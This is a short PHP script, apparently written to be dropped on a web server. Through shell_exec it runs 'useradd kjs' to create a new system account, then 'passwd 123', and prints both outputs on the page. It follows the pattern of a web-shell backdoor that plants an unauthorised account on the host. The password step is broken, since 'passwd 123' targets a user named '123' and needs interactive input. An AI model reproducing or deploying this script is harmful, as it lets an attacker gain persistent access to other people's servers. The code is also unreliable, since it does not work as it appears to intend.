<?php
$data1 = shell_exec("useradd kjs");
$data2 = shell_exec("passwd 123");
echo "<pre> $data1 </pre>";
echo "<pre> $data2 </pre>";

?>